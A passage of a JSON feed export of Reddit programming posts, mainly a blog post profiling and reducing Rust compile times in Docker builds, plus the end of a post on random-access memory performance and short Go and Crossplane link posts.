Linux! These numbers actually look pretty\n          comparable to what we were seeing earlier, especially once you double\n          them to account for the fact that here we only need to read one file\n          instead of two. My best guess is that the SSD I have for my Linux\n          machine has lower bandwidth than my MacBook SSD, but the Linux\n          operating system handles memory-mapped files more intelligently than\n          macOS does. Hard to say for sure without trying the same experiment\n          with different operating systems on the same hardware, though.\n        </p><p>\n          And there you have it! Here are the answers we learned for the\n          questions posed at the start of the post:\n        </p><ol><li>\n            Summing numbers is fairly memory-bound, so there's basically no\n            difference for arrays smaller than a million elements (the size of a\n            typical L3 cache). On my Linux machine, though, there doesn't seem\n            to be a direct correspondence between this cutoff point and the\n            actual L3 cache size.\n          </li><li>\n            In first-to-last order, the average time per element levels out to\n            about a nanosecond on my MacBook, or about half a nanosecond on my\n            Linux desktop.\n          </li><li>\n            For arrays too big for the L3 cache but under about a gigabyte,\n            random order is about 4x slower on my MacBook, and about 8-16x\n            slower on my Linux desktop.\n          </li><li>\n            On Linux, random order starts getting even slower for arrays over a\n            gigabyte, becoming more than 50x slower than first-to-last order; in\n            contrast, random order on the MacBook seems to just level out as\n            long as everything fits in RAM.\n          </li><li>\n            Fisher-Yates is way too slow for data too big to fit in memory! Use\n            a two-pass shuffle instead.\n          </li><li>\n            Memory-mapped files are not magic: for data too big to fit in RAM,\n            first-to-last order finally gets slower, by about 20x. After this\n            point, random order still seems to be slower on Linux, but seems\n            about the same speed as first-to-last order on the MacBook.\n          </li><li>\n            Interestingly, while that effect stays when switching to a more\n            direct approach on Linux, it seems to magically go away on macOS;\n            perhaps due to a difference in how the two OSes handle memory-mapped\n            files?\n          </li></ol><p>Let me know if I got anything wrong! And I hope you enjoyed.</p>","contentLength":12867,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lldxio/how_much_slower_is_random_access_really/"},{"title":"\"Why is the Rust compiler so slow?\"","url":"https://sharnoff.io/blog/why-rust-compiler-slow","date":1750977686,"author":"/u/ketralnis","guid":172607,"unread":true,"content":"<div><p>I spent a month repeatedly building my website in Docker, and now have horrors to share.</p></div><p>My website (the one you're reading right now) is mainly served by a single Rust binary.\nFor  now, every time I wanted to make a change, I would:</p><ol><li>Build a new statically linked binary (with <code>--target=x86_64-unknown-linux-musl</code>)</li></ol><p>So instead, I'd like to switch to deploying my website with containers (be it Docker, Kubernetes, or otherwise),\nmatching the vast majority of software deployed any time in the last decade.</p><p>The only issue is that fast Rust builds with Docker are not simple.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#basics\"></a><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#rust-in-docker-simple\"><h3>Rust in Docker, the simple way</h3></a><p>To get your Rust program in a container, the typical approach you might find would be something\nlike:</p><pre><code></code></pre><p><strong>Unfortunately, this will rebuild everything from scratch whenever there's any change</strong>.</p><p>In my case, building from scratch takes about 4 minutes (including 10s to download the crates every time).</p><pre><code></code></pre><p>Sure, it could be worse. But I've grown accustomed to speedy local builds, thanks to incremental compilation — I don't\nwant to wait that long on every tiny change!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#rust-in-docker-cargo-chef\"><h3>Rust in Docker, with better caching</h3></a><p>Thankfully, there's a tool to help with this!</p><p>Luca Palmieri's <a href=\"https://github.com/LukeMathWalker/cargo-chef\"></a> makes it easy to pre-build all of the dependencies as a separate layer in the docker\nbuild cache, so that changes in your codebase only trigger re-compilation of your codebase (and not your dependencies).</p><p>I'll save the detailed explanation for <a href=\"https://lpalmieri.com/posts/fast-rust-docker-builds/\">Luca's blog post</a>, but broadly  creates a simplified \"recipe\" file from\nthe current workspace, which can be \"cooked\" to cache the dependencies without being invalidated by changes in the\nworkspace.</p><p>My website pulls in a few hundred dependencies, so this  help!</p><pre><code>...\n\n</code></pre><p>Unfortunately though, it doesn't have quite the speedup we're looking for — most of the time is still in the final\nbinary:</p><pre><code></code></pre><p>Weirdly, only 25% of the time is actually spent on the dependencies! As far as I could tell, my code isn't doing\nanything fundamentally unreasonable. It's ~7k lines of gluing together various larger dependencies (, ,\n, among others.)</p><p><em>(Just to double-check, I tried running  with . It really was just a single\ninvocation of  that took almost 3 minutes!)</em></p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#whats-rustc-doing\"><h2>What's  doing for all that time?</h2></a><pre><code></code></pre><p>In addition to that <code>cargo-timing-&lt;timestamp&gt;.html</code> file, there's also a . We'll\njust copy out the canonical version:</p><pre><code>...\n\n</code></pre><p>And with a little bit of container wrangling...</p><pre><code> cargo-timing.html\n container </code></pre><p>... we should be able to see what's going on! Let's have a look:</p><p> There's not really much information there!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#cargo-timings-weirdness\"></a><p> shows a bunch of information about <em>how long each crate took to compile</em>. But here, we only care\nabout the compilation time of the final crate!</p><p>That aside, this does help give us more accurate timing. Measuring outside the compiler adds some extra moving\npieces, or requires searching the output of  — so using 's self-reported timings will make more\nprecise analysis a bit easier, later on.</p><p>Just to check, the value here of 174.1s roughly matches the \"2m 54s\" we saw from the  output.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#rustc-self-profile\"><h2>Actually asking  this time</h2></a><p>The post from fasterthanlime had one more tip we can use — 's self-profiling feature, via the \nflag.</p><p>Normally, you'd probably run something like:</p><pre><code> rustc  --  self-profile\n</code></pre><p><em>(note: This is using  to pass extra flags to , with  to allow using the \nunstable flags on a stable compiler.)</em></p><p>Unfortunately, this won't work here — the change in arguments will invalidate the cached dependencies from\n, and there's no equivalent way to pass additional  flags through .</p><p>Instead, we can funnel everything via the  environment variable:</p><pre><code> chef cook .\n\n build .\n</code></pre><p>This gives us files like <code>web_http_server-&lt;random-number&gt;.mm_profdata</code>, which we can move and extract from the image in\nthe same way as we did for .</p><p><em>(note: It's much easier to automate if we remove the profiling data that was added from  before the\nfinal build. That's omitted here, for brevity.)</em></p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#using-rustc-profdata\"><h3>Actually using the profdata</h3></a><ul><li> – produces plaintext output summarizing the profiling data</li></ul><p>But let's install a couple of these to take a look at what we've got:</p><pre><code> https://github.com/rust-lang/measureme flamegraph summarize\n</code></pre><p>I personally use Firefox, so we'll hold off on the chrome tracing stuff for now.</p><p>First, with  (which itself has the  and  subcommands):</p><pre><code></code></pre><p>So at a high level, the two biggest things are <a href=\"https://www.llvm.org/docs/LinkTimeOptimization.html\">link-time optimization</a> (LTO) and\n<code>LLVM_module_codegen_emit_obj</code>, whatever that is.</p><p>Let's see if we can dig a bit deeper with the flamegraph:</p><pre><code></code></pre><p><em>(It's interactive! If you're curious, you can click through and play around with it yourself.)</em></p><p>So there's presumably some inter-mingling going on between codegen and LTO: <code>codegen_module_perform_lto</code> ends up falling\nthrough to both / and .</p><p>But either way, we've got a problem with LTO: <code>codegen_module_perform_lto</code> took ~80% of the total time.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#about-lto\"><h2>It's time to talk about LTO</h2></a><p>The Rust compiler splits up crates into \"<a href=\"https://doc.rust-lang.org/rustc/codegen-options/index.html#codegen-units\">codegen units</a>\", handing each to LLVM as a separate module to compile.\n, optimizations take place within each codegen unit, and then they're linked together at the end.</p><p>LTO controls the set of optimizations that LLVM will make during that link-time — for example, inlining or\noptimization across codegen units.</p><ul><li>\"thin\" LTO — in theory, similar performance benefits to \"fat\" LTO, but less expensive to run</li><li>\"fat\" LTO — maximum amount of LTO, across all crates at the same time</li></ul><p>And if the LTO option is not specified,  uses \"thin local LTO\", which limits \"thin\" LTO only to a single crate at\na time.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#lto-current-settings\"><h3>What are the current settings</h3></a><p>Turns out that a few years back, I had set  in my :</p><pre><code></code></pre><p>And, while we're at it, <a href=\"https://doc.rust-lang.org/cargo/reference/profiles.html#debug\"></a> enables all debug symbols (where they'd normally be excluded by default for the\n profile). Maybe we should take a look at that as well.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#lto-tweaking-settings\"><h3>Tweaking the (normal) settings</h3></a><p>Let's take a look at the compile times and binary sizes for a variety of  and  settings (using\n like before, for more precise timing).</p><div><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table></div><p>At a high level: It seems like the worst cases here are full debug symbols adding 30-50% to the compilation time, and\n\"fat\" LTO taking about  than with LTO fully disabled.</p><p>That mostly tracks with what we'd expect from the documentation — yeah, fat LTO takes longer. But when we disable\neverything, we're still looking at 50 seconds compiling the final binary!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#brief-note\"><h2>A brief note: 50 seconds is , actually!</h2></a><p>Look, 50 seconds is already a great improvement — and if it requires disabling LTO and debug symbols... my website\ngets approximately zero load. <em>It would be totally fine.</em> It would be perfectly sustainable, even!</p><p><strong>There's no practical reason to keep digging here.</strong></p><p>But where's the fun in leaving it there? We should be able to do better, right?</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#brief-note-2\"><h2>Another brief note: Can't we just use incremental compilation?</h2></a><p>It's slightly more complicated, but yes, absolutely — for local development, at least. Consistently loading the build\ncache isn't straightforward, but you'd want to make the  directory accessible with a <a href=\"https://docs.docker.com/build/cache/optimize/#use-cache-mounts\">\"cache mount\"</a> in the\ndockerfile, and persist that target directory between builds.</p><p>That said, I value that  have a clean environment every time, and I think it's worthwhile to go\nthrough docker's own caching system — which is why I'm using  in the first place.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#et-tu-llvm_module_optimize\"><h2>Digging deeper: Et tu, ?</h2></a><p>If we disable LTO and debug symbols, compiling the final binary still takes 50 seconds to do... something.</p><p>Let's re-run the self-profiling to check out what's going on.</p><p>It's ~70% just  — i.e. where LLVM is optimizing the code. Before diving into LLVM itself, let's\nsee if there's any easier knobs we can tune.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#tuning-optimization\"></a><p>The  profile uses  by default — maybe if we reduce the optimization level, we'll spend less\ntime on it.</p><p>We can actually do one better — since our dependencies are cached, and we only care about the final binary, we can get\nmost of the benefits by only reducing optimizations on the final binary:</p><pre><code></code></pre><p>Like the previous options, there's a handful of <a href=\"https://doc.rust-lang.org/cargo/reference/profiles.html#opt-level\">s</a> we can choose from:</p><ul><li>, , and  enable increasing levels of optimizations</li><li> and  are different flavors of prioritizing binary size</li></ul><p>Going through a handful of combinations here again:</p><div><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table></div><ul><li>The baseline for  level of optimizations on the final binary is about 50 seconds</li><li>If we disable all optimizations, then it's pretty quick: only ~15s</li></ul><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#profiling-llvm\"></a><p>Rust relies pretty heavily on optimizations, and while it'd probably be fine to just blanket-disable them for the final\nbinary, it'd be pretty cool if we can at least keep  optimizations!</p><p><strong>So let's try to figure out what's taking so long.</strong>'s self-profiling doesn't give us any more detail though,\nso we'll have to get it from LLVM.</p><ul><li> – emit LLVM profiling information as plaintext</li><li> – emit LLVM profiling information in the chrome tracing format (again with that one!)</li></ul><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#profiling-llvm-text\"><h3>Profiling LLVM with  — plain text</h3></a><p>Like before, let's skip the chrome tracing format for now, and see what we can get from plain text.</p><pre><code> chef cook .\n\n build .\n</code></pre><p>... Unfortunately if you try to  again, you'll immediately hit something like:</p><pre><code>[output clipped, log limit 2MiB reached]\n</code></pre><p>This is because <a href=\"https://docs.docker.com/build/buildkit/\">BuildKit</a> (if you're using ~recent Docker on Linux) has default output limits that are pretty small.</p><p>So after getting unlimited  output on the terminal, what's in it?\n — probably not what you want to be copying from your terminal, anyways.</p><p>So, redirecting to a file inside docker and copying that out like before, we get a bunch of pass/analysis timing\nreports. They each look something like this:</p><pre><code>===-------------------------------------------------------------------------===\n                          Pass execution timing report\n===-------------------------------------------------------------------------===\n  Total Execution Time: 0.0428 seconds (0.0433 wall clock)\n\n   ---User Time---   --System Time--   --User+System--   ---Wall Time---  — Name ---\n   0.0072 ( 19.2%)   0.0015 ( 27.4%)   0.0086 ( 20.2%)   0.0087 ( 20.0%)  InstCombinePass\n   0.0040 ( 10.8%)   0.0006 ( 10.8%)   0.0046 ( 10.8%)   0.0047 ( 10.8%)  InlinerPass\n   0.0024 (  6.4%)   0.0010 ( 18.0%)   0.0034 (  7.9%)   0.0034 (  7.8%)  SimplifyCFGPass\n   0.0022 (  5.9%)   0.0002 (  4.5%)   0.0025 (  5.7%)   0.0024 (  5.6%)  EarlyCSEPass\n   0.0021 (  5.5%)   0.0001 (  1.5%)   0.0021 (  5.0%)   0.0022 (  5.0%)  GVNPass\n   0.0015 (  4.0%)   0.0001 (  2.2%)   0.0016 (  3.8%)   0.0018 (  4.2%)  ArgumentPromotionPass\n\n   ... entries here continue, and more passes below, for hundreds of thousands of lines ...\n</code></pre><p>It certainly is  to parse and analyze these! But it's also hard to be certain about what you're looking at\nwhen each pass execution is emitted separately and multi-threading can interfere with timing.</p><p>Let's see if there's a better way to get good data.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#profiling-llvm-trace\"><h3>Profiling LLVM with  — actual tracing this time</h3></a><p>We skipped  earlier because it emits the chrome tracing format.</p><pre><code> chef cook .\n\n build .\n</code></pre><p>It produces a bunch of <code>$package-$hash.llvm_timings.json</code> files, alongside the normal compilation artifacts:</p><pre><code></code></pre><p><em>(Why ? Setting up rootless docker didn't work when I tried it a few years back, and I haven't bothered since)</em></p><p>So, deleting  between  and the final build, we can extract the singular profile for the\nfinal binary into <code>web_http_server.llvm_timings.json</code>.</p><p>There's just one minor hiccup:</p><pre><code></code></pre><p>It's . It's also all one single line!</p><p>In theory though, a wide variety of tools should be able to process this:</p><p>None of these options worked for me — but it's a big JSON file with a <a href=\"https://docs.google.com/document/d/1CvAClvFfyA5R-PhYUmn5OOQtYMH4h6I0nSsKchNAySU/preview?tab=t.0\">known format</a>, how hard can it be?</p><p>Turns out, a 1.4GiB single line of JSON makes all the normal tools complain:</p><ul><li>If you try to view it with , scrolling blocks on processing the entire file</li><li>If you try to process it with , it has to load the entire 1.4GiB into 's internal format (which expectedly\ntakes up  more than the original 1.4GiB)</li><li>Vim hangs when you open it</li><li>And you probably don't want to just  it to the terminal — again, it's 1.4GiB!</li></ul><p>So instead, we can just look at a few hundred characters, at the start and end of the file:</p><pre><code></code></pre><p>Matching this to the <a href=\"https://docs.google.com/document/d/1CvAClvFfyA5R-PhYUmn5OOQtYMH4h6I0nSsKchNAySU/preview?tab=t.0#heading=h.q8di1j2nawlp\">\"JSON Object Format\"</a> from the chrome tracing spec, it seems we have a single JSON object like:</p><pre><code>\n    ...\n  </code></pre><p>We'd be able to process it with normal tools if we split each event into its own object. That could be something like:</p><pre><code> web_http_server.llvm_timings.json  web-http-server.llvm_timings.jsonl\n</code></pre><p><em>(i.e.: turn  into a newline, strip the start of the object, strip the end of the object)</em></p><p>And  we can process this.</p><pre><code></code></pre><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#whats-in-llvm-trace\"><h2>What's in LLVM's trace events?</h2></a><p>It looks like these events all have .</p><p>According to the spec, the  field gives the type of event, and  refers to \"complete\" events, recording how long a\nparticular piece of work took on a given thread (). The duration in microseconds is given by .</p><p>Aside from that, we also have  events:</p><pre><code></code></pre><p>These are \"metadata\" events — in our case, not much useful information.</p><p>And aside from these, there's nothing else:</p><pre><code></code></pre><p>Going back to those  events — there were a bunch of them with . What else do we have?</p><pre><code></code></pre><p>Neat! It looks like we might be able to demangle some of the symbols to get timings on individual functions.</p><p>If we track what's being run and how long it takes, we should be able to get a better sense of why our compile time is\nso long.</p><p>Later on, there's aggregate information for certain types of events, like . These are equivalent to\nthe sum of the duration for that event type (in this case, ). Let's see kind of operations are taking the\nmost time:</p><pre><code></code></pre><p>This particular run took ~110 seconds on a 16-core machine, so it's clear that some passes are being double-counted\n(which makes sense — we see both , and it looks like \nprobably just calls ).</p><p>But broadly, it seems like optimization () and inlining () are the two parts taking a lot of\ntime — let's see if we can do anything about it.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#making-inlinerpass-faster\"><h2>Can we make  any faster?</h2></a><p>LLVM has a bunch of arguments that can be configured, which  exposes through the  flag. At time of\nwriting (June 2025), there's somewhere in the region of ~100 options that mention inlining (via <code>rustc -C llvm-args='--help-list-hidden'</code>).\nIn particular, there's a <a href=\"https://github.com/llvm/llvm-project/blob/c7063380205d8776e281f7a6603119aa8ea28c12/llvm/lib/Analysis/InlineCost.cpp#L58-L176\">bunch of relevant options</a> in the file controlling the cost analysis.</p><p>Now, I'll be honest, I know  about LLVM's inlining. Most of the options refer to the \"cost\" associated\nwith the inlining, or with the function being inlined, etc. <strong>I'm flying mostly bind here.</strong> But there's a few arguments\nthat seem like decent candidates for tuning:</p><ul><li><code>--inlinedefault-threshold=225</code> — \"Default amount of inlining to perform\"</li><li> — \"Control the amount of inlining to perform\"</li><li><code>--inlinehint-threshold=325</code> — \"Threshold for inlining functions with inline hint\"</li></ul><p>For all of these, the \"threshold\" roughly means \"allow inlining functions with cost  the threshold\", so a higher\nthreshold means more inlining.</p><p>So if we set all of these to some value (e.g., ), we should see that there's less inlining, and in turn faster\ncompile times.</p><pre><code>.\n</code></pre><p><em>(Why separate ? I couldn't find a way to make the whitespace happy through the  environment\nvariable — maybe it's possible if you set  in , but this solution worked 🤷)</em></p><p>In any case, reducing to a threshold of 50  end up faster! About 42.2s, down from 48.8s.</p><p>Here's what that looks like across a handful of values:</p><p><em>(note: The smallest value is 1, and not zero. Why 1? Sometimes zero has special behavior – setting to one seemed like a safer bet.)</em></p><p>Of these, it's hard to say exactly what the best value is, but for my use case (remember: my website gets ~zero load!),\nsetting the thresholds to 10 looks promising. We'll hold off on that for now though.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#making-optfunction-faster\"><h2>Can we make  any faster?</h2></a><p>Optimizing functions was the other expensive task we saw.</p><p>The knobs here are much less clear to me (we're already at , and  compeltely disables\noptimizations). So, let's see what exactly is taking so long.</p><p>First, a brief look at the event format:</p><pre><code></code></pre><p>In its raw form, each of the events'  field has the mangled symbol of the function being optimized. We can\n\"demangle\" these back to the original Rust symbols with <a href=\"https://github.com/luser/rustfilt\"></a> — for example:</p><pre><code></code></pre><p>It's worth noting that in the list above, while there's several <code>serde_json::value::to_value</code> items, they actually have\ndistinct hashes:</p><pre><code></code></pre><p>... which makes sense, given that <code>serde_json::value::to_value</code> is a generic function — it might be that it's being\noptimized with different generic parameters (\"monomorphizations\").</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#why-optimizing-other-crates\"><h3>Wait, why are we optimizing functions from other crates?</h3></a><p>The short answer is that optimization is done <em>in the context of the crate where a function is monomorphized</em>. So if we\ndefine a type  and then call methods on , those methods  will first exist in the\ncontext of our crate — meaning it gets compiled and optimized with the same configuration as our crate.</p><p>With some knowledge about how the compiler works under the hood, this should hopefully make some sense — but from the\noutside, it's certainly a little odd!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#what-are-we-optimizing\"><h3>What's actually taking so long?</h3></a><p>Now that we know what we're looking at, we can start doing some analysis. For example, by finding the individual\nfunctions we spent the most time optimizing:</p><pre><code></code></pre><p><em>(Why two separate  invocations? If we did just one, the / call would load the entire file\ninto a single array before any processing, which is one of the key operations we're trying to avoid)</em></p><p>This is a surprising amount of time on individual functions! Profiling roughly doubled the total time to compile, but\neven 1 second optimizing a single function is quite a long time!</p><p>But let's look into more detail here. We've got:</p><ul><li><code>web_http_server::photos::PhotosState::new::{{closure}}</code> — this is  closure inside a giant, 400-line async\nfunction that does the setup for <a href=\"https://sharnoff.io/photos\">https://sharnoff.io/photos</a></li><li><code>web_http_server::run::{{closure}}</code> — this is inside the main entrypoint (also async), but all the closures are small\nerror-handling, like <code>.wrap_err_with(|| format!(\"failed to bind address {addr:?}\"))</code><ul><li>Maybe there's something weird going on here!</li></ul></li></ul><p>... and a handful of dependencies that also took a while:</p><p>, we could break it down by the outermost crate:</p><pre><code></code></pre><p>This is, of course, a very imperfect measure — the outermost crate isn't necessarily the best one to attribute the\ncompilation time to, and there's a lot of items like  that aren't captured by this simple filtering.\nBut all that aside, it's still surprising that there's so much from !</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#closures-mangling-v0\"><h3>Digging more into closures, with mangling v0</h3></a><p>The long compile times for closures seems very suspicious — maybe it's worth digging further. There's just one\nproblem: the symbols all end with  without saying  is taking all the time.</p><p>As it turns out, there's an easy fix! As of June 2025,  currently uses the \"legacy\" symbol mangling format by\ndefault, but there's a newer option with more information: the <a href=\"https://doc.rust-lang.org/rustc/symbol-mangling/v0.html\">v0 format</a>.</p><p>We can enable it by adding <code>RUSTFLAGS=\"-C symbol-mangling-version=v0\"</code> to our existing flags, which now look something\nlike:</p><pre><code>RUSTC_BOOTSTRAP=1 RUSTFLAGS=\"-Csymbol-mangling-version=v0 -Zllvm-time-trace\" cargo build --timings ...\n</code></pre><p><em>(aside: The issue for that feature's been open for 6 years, why hasn't it been merged yet? Turns out, there's a lot of\nupstream work required to add support in common tools like  and . A lot of that has been done, but not yet\neverything.)</em></p><p>The end result of this is that we get  better symbols coming out of the LLVM trace. As an example, here's what\nthose <code>serde_json::value::to_value</code> symbols look like now:</p><pre><code></code></pre><p>So not only do we get better closure labeling (see e.g. ) but we also get full generics for everything!</p><p>Exactly what's taking so long  be much clearer now:</p><pre><code></code></pre><p>... but those first few closures are :</p><pre><code> is_jpg  path s</code></pre><pre><code> app  feed </code></pre><p>And if we remove these closures, replacing them with separately defined functions where possible, LLVM  reports\ntaking a long time to optimize  in the outer function.</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#async-closure0\"><h3>So where are those closures coming from?</h3></a><p>After dumping the LLVM IR with <code>RUSTFLAGS=\"--emit=llvm-ir\"</code> (which places it into ) and searching\nthrough the generated functions, I found a line like:</p><p>That  function was a nested async function, defined directly inside  — so why did the\nsymbol say it was defined inside a closure?</p><p>It's because <em>internally represents async functions/blocks with a nested closure</em>. So all of these places that\nwe had async functions where compiling  took a long time were actually just referring to the function itself!</p><p>With some quick github searching (<code>is:issue state:open async fn closure mangle</code>), it turned out there was already an\n<a href=\"https://github.com/rust-lang/rust/issues/104830\">open issue about this</a>!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#big-async-functions-considered-harmful\"><h3>Big async functions considered harmful?</h3></a><p>Going back to our list from before – those async functions where LLVM takes a long time to optimize  are\nreally just spending a long time on the body of the function itself. It would make sense that big functions are hard to\noptimize, and async functions doubly so.</p><p>It's  straightforward to identify all of the functions inside the main crate that are taking a long time:</p><pre><code></code></pre><p>Some of the most expensive functions here are around setup.</p><p><strong>Let's try breaking up just one function, to see if it helps.</strong> We'll start with .</p><p>On the first attempt, I tried breaking it up while also preserving the number of s – it's easy to do both\naccidentally, and this would hopefully isolate which type of complexity is causing problems.</p><p>Interestingly, this didn't help all that much: only reducing the total time from 5.3s to 4.7s.</p><p>So to add to that, I tried merging a handful of neighboring s into their own functions — reducing the total\nnumber from 10 to 3.</p><p>But that took substantially longer! It increased from 4.66s to 6.24s!</p><p>At this point, it seemed like there was something strange happening with async functions. Otherwise, why would splitting\ninto more functions make things worse?</p><p>Under the hood, async functions desugar to a complex state machine. There might be something odd happening there, so if\nwe want to make that simpler in the caller, we can turn the  into a trait object to obscure the implementation\nbehind it (typically ).</p><p>So this time, let's add a new function like:</p><pre><code>\n    futfut</code></pre><p>and using it everywhere we . For example:</p><pre><code> candidates  candidates </code></pre><p><strong>This one worked — down to 2.14s.</strong></p><p>So, a reduction from 5.3s to 2.14s – a notable improvement, albeit with a lot of effort to get there. (and, for the\nrecord, when I wrapped the futures with  instead of a fresh function, it didn't make a difference here).</p><p>Re-running the build without profiling, this gives a total reduction from 48.8s to 46.8s. It's pretty small, but that's\nfrom just a single function!</p><p><em>(Aside: What about ? I tried it with and without – after boxing, compile times weren't any better\nwith inlining disabled for those functions, but it's still helpful for ensuring better attribution on the LLVM\ntimings.)</em></p><p><em>(Aside: What about disabling inlining on the  functions? I also tried wrapping the async functions with a\n implementation having  on its poll function. That helped , but wasn't as good as\nboxing.)</em></p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#putting-it-together\"></a><p>There's a number of approaches available — let's try:</p><ol><li>Reducing inlining with LLVM args;</li><li>Breaking up expensive functions in the main crate; and</li><li>Removing generics from dependencies to prevent needing to compile it in the main crate</li></ol><p>So, updating the final Dockerfile commands to read:</p><pre><code>\n\n...\n\n</code></pre><p>... and many more small changes to the main crate:</p><pre><code></code></pre><p>... alongside some changes to larger dependencies:</p><p>... gives us a final compile time of .</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#update-2025-06-27\"></a><p>After I shared this post, a couple folks on Bluesky gave some good tips!</p><ol><li>Enabling ; and</li><li>Switching away from Alpine</li></ol><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#z-share-generics\"></a><blockquote><p>It'll reuse instantiations of generics from the dependencies of a crate. It is not enabled for release builds (by\ndefault), as it has a negative impact on codegen.</p><p>The flag is available only on nightly, but it is enabled for dev builds even when using a stable tool chain.</p></blockquote><p>Sounds neat! Let's try enabling it!</p><pre><code>.\n</code></pre><p>The end result is interesting — <strong>a drop in total compile time from 32.3s to 29.1s</strong>, even though many of the\ns that we were compiling before are still present.</p><p>Looking at the biggest times, filtering just for  for concrete types exposed by other crates:</p><pre><code></code></pre><p>There's some change between them, but it's still compiling the same  for a lot of\ndependencies!</p><p>In spite of that though, the optimization time decreased substantially — from 21.7s to 17.4s if you look just at the\n instantiations, and far more if you look at everything together (128s to 104s; across multiple threads,\nwith LLVM profiling's overhead).</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#switching-from-alpine\"><h3>Switching away from Alpine</h3></a><blockquote><p>In my experience the allocator can have a big impact on build times. For example when Chimera Linux switched from\nscudo (which was already better than the default musl allocator) to mimalloc a clean build of Gleam went from 67s to\n46s.</p><p>Similar results can be observed by switching the base image of a build in docker [ ... ]</p></blockquote><p><strong>This made a huge difference.</strong></p><p>After switching out alpine for debian and removing the <code>--target=x86_64-unknown-linux-musl</code>, the total compile time\ndropped from 29.1s all the way down to 9.1s!</p><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#final-recap\"></a><ol><li>Disabling LTO (and debug symbols!) got us to 51s (-71%) </li><li>Changing to  on the final crate got us to 48.8s (-4%)</li><li>Reducing inlining with  got us to 40.7s (-16%) </li><li>Local changes got us to 37.7s (-7%) </li><li>Changes with dependencies got us to 32.3s (-14%) </li></ol><ol start=\"7\"><li>Enabling  got us to 29.1s (-10%) </li><li>And switching away from alpine got us to 9.1s (-69%) </li></ol><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow#what-now\"></a><p>While I did hit a lot of issues here, the tooling honestly worked really well – and the documentation was sufficient for\nsomeone with relatively little experience to make meaningful improvements to their codebase.</p><p>Some of the issues are straightforward: bugfixes to provide a nicer experience for the next person that finds themselves\nin a similar mess.</p><p>Others are more complicated:</p><ul><li><p>The compile time of deep call graphs of async functions needs to be improved – perhaps LLVM has a degenerate edge\ncase that's easy to trigger with what  generates, or maybe it's as simple as a bad heuristic that's\nunder-utilized in other languages.</p></li><li><p>It  be worthwhile for  to special-case <code>core::ptr::drop_in_place&lt;T&gt;</code> so that it's compiled in the crate\nthat defines . That approach wouldn't work for everything – for example, generic types – but would prevent\ndownstream crates from needing to re-compile the same destructor multiple times.</p><ul><li> help here, but it's not a complete fix. In the meantime, however,\nI found that this is actually something that's <a href=\"https://github.com/rust-lang/rust/issues/84175\">been previously discussed</a> — unfortunately it seems like\n<a href=\"https://github.com/rust-lang/rust/pull/108838#issuecomment-1471619165\">it causes severe increases in compile time</a> due to compiling all the drop glue that would otherwise be unused.\nIt's possible that there's some middle ground here (e.g., signaling that you want to prioritize compile times of\nthe final binary to the detriment of the dependencies), but it's hard to say what the right approach is.</li></ul></li><li><p>There might also be room for tooling to help with isolating which parts of a codebase are taking up the most time\nduring compilation (and providing recommendations to mitigate) – although that's a longer project than just this post.</p></li></ul><p><strong>In the meantime, setting  might be just fine :)</strong></p><div><p><em>(questions? comments? Feel free to reach out below!)</em></p></div>","contentLength":26373,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lldxe8/why_is_the_rust_compiler_so_slow/"},{"title":"Go 1.25 interactive tour","url":"https://www.reddit.com/r/golang/comments/1lldj05/go_125_interactive_tour/","date":1750976627,"author":"/u/Capable_Constant1085","guid":172561,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1lldj05/go_125_interactive_tour/\"> <img src=\"https://external-preview.redd.it/J-gqz7pSx0ox2IW4iaPMm5TlAEdMx5V27fbi1OJLzN4.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=17842328ff0958292164b79fbe221330966e7443\" alt=\"Go 1.25 interactive tour\" title=\"Go 1.25 interactive tour\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Capable_Constant1085\"> /u/Capable_Constant1085 </a> <br/> <span><a href=\"https://antonz.org/go-1-25/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lldj05/go_125_interactive_tour/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A TUI to explore Crossplane traces","url":"https://www.reddit.com/r/golang/comments/1lld2uc/a_tui_to_explore_crossplane_traces/","date":1750975455,"author":"/u/brnluiz","guid":172560,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I have been working recently with Crossplane and when 